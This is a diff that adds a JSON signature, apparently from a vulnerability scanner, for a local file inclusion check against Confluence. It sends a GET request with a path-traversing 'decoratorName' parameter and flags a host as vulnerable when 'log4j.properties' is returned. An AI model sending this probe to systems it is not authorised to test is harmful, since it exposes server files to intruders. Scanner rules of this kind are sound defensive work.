@@ -1,0 +1,11 @@
+{
+    "name": "Confluence_LFI",
+    "method": "GET",
+    "port": [
+        80
+    ],
+    "suffix": "/spaces/viewdefaultdecorator.action?decoratorName=/",
+    "hits": [
+        "log4j.properties"
+    ]
+}
